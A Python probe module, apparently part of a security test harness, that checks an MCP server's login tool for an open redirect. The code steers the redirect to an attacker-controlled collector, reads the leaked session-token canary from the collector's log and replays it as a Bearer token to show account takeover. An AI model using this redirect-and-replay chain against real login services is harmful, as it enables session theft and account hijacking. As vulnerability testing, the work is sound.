"""T11.3 / SAM1-22 — open redirect (CWE-601) + session-token exfil (CWE-200/552) probe.

complete_login(return_to) issues a post-login redirect carrying the victim's SESSION TOKEN. Ground
truth only: FIRES iff that token — which the attacker is NOT entitled to — is emitted off-origin AND
lands at the attacker's OWN collector. The captured token is then replayed to account_summary to
DEMONSTRATE account takeover (the HIGH practical impact), so severity reflects what the token grants.
Oracle is pure substring / collector request-log; no URL/redirect parser decides the fire.
"""
from __future__ import annotations

import httpx

from mcp_rt.mcp_client import StatelessHTTPClient, _result_text_2026


def session_canary(tok: str) -> str:
    return f"SESS-{tok}"


def account_canary(tok: str) -> str:
    return f"ACCOUNT-{tok}"


def _login(url: str, return_to: str) -> str:
    return _result_text_2026(StatelessHTTPClient(url).begin(
        "tools/call", {"name": "complete_login", "arguments": {"return_to": return_to}}))


def probe_open_redirect(url: str, tok: str, collector_base: str, collector_received: list) -> dict:
    emitted = _login(url, f"{collector_base}/collect")          # attacker return_to = off-origin collector
    loc = emitted.split("redirect:", 1)[-1].strip()
    if loc.startswith("http"):                                   # victim's client follows the off-origin redirect
        try:
            httpx.get(loc, timeout=10)
        except Exception:
            pass
    logged = any(session_canary(tok) in r for r in collector_received)   # token reached the ATTACKER collector
    in_redirect = session_canary(tok) in emitted                         # server actually emitted it off-origin
    captured = ""
    for r in collector_received:
        if "token=" in r:
            captured = r.split("token=", 1)[1]                   # attacker reads the token off its own log
    return {"case": "open_redirect", "fired": logged and in_redirect,
            "collector_logged": logged, "in_redirect": in_redirect, "captured": captured,
            "evidence": emitted[:160]}


def probe_account_takeover(url: str, tok: str, captured_token: str) -> dict:
    text = _result_text_2026(StatelessHTTPClient(url).begin(
        "tools/call", {"name": "account_summary", "arguments": {}},
        extra_headers={"Authorization": f"Bearer {captured_token}"}))
    return {"case": "account_takeover", "ato": account_canary(tok) in text, "evidence": text[:120]}


def probe_benign(url: str, tok: str) -> dict:
    emitted = _login(url, "/dashboard")                          # legitimate same-origin return_to
    loc = emitted.split("redirect:", 1)[-1].strip()
    return {"case": "benign", "fired": False,
            "completes": "/dashboard" in emitted and session_canary(tok) in emitted,
            "off_origin_leak": loc.startswith("http"), "evidence": emitted[:120]}
